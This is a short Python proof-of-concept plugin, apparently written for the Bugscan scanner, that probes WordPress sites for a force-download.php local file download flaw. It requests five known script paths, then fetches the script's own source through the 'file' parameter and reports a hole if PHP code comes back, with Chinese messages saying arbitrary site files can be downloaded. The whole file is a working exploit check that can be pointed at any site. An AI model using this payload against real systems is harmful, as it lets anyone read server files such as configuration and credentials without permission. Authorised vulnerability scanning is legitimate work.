#!/usr/bin/env python
# -*- coding: utf-8 -*-
#POC Name  :   Wordpress force download Local File Download
#Reference  :  https://www.bugscan.net/#!/x/21323
#__author__ = 'range'

import  re

def assign(service, arg):
    if service == "wordpress":
        return True, arg

def audit(arg):
    url = arg
    payload_list = ['/force-download.php', '/wp/wp-content/force-download.php', '/wp-content/force-download.php', '/wp-content/themes/ucin/includes/force-download.php', '/wp-content/uploads/patientforms/force-download.php']
    for payload in payload_list:
        verify_url = url + payload
        code, head, res, errcode, _ = curl.curl(verify_url)
        if code == 200:
            final_url = verify_url + '?file=force-download.php'
            code, head, res, errcode, _ = curl.curl(final_url)
            if '<?php' in res:
                security_hole(final_url + '该地址能够通过“file”参数任意下载网站文件(如' + final_url + ')')
            else:
                security_info(verify_url + '该地址或许能够通过“file”参数任意下载网站文件')

if __name__ == '__main__':
    from dummy import *
    audit(assign('wordpress', 'http://www.example.com/')[1])
